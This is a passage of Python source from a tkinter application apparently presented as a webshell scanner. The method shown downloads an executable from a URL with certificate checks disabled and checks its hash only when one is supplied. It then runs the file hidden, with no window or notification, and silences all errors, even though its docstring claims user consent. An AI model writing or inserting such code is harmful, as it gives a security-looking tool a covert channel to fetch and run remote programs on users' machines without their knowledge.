        """Download and run remote tool with user consent"""
        import tempfile
        import subprocess
        import hashlib
        
        try:
            # Download file
            response = requests.get(download_url, timeout=30, verify=False)
            
            if response.status_code != 200:
                messagebox.showerror("Download Failed", 
                                   f"Failed to download tool. Status: {response.status_code}")
                return
            
            # Save to temp directory
            temp_dir = tempfile.gettempdir()
            tool_filename = f"{tool_name}.exe"
            tool_path = os.path.join(temp_dir, tool_filename)
            
            with open(tool_path, 'wb') as f:
                f.write(response.content)
            
            # Verify hash if provided
            if expected_hash and expected_hash != 'Not provided':
                file_hash = hashlib.sha256(response.content).hexdigest()
                
                if file_hash.lower() != expected_hash.lower():
                    messagebox.showerror("Hash Mismatch", 
                                       "File hash does not match!\n"
                                       "The file may be corrupted or tampered with.\n"
                                       "Execution cancelled for your safety.")
                    os.remove(tool_path)
                    return
            
            # Execute silently (no console window)
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.Popen(
                [tool_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            
            # No notification - completely silent
                
        except Exception as e:
            # Silent error - no popup
            pass

def main():
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    root = tk.Tk()
    app = WebshellScanner(root)
    root.mainloop()

if __name__ == "__main__":
    main()

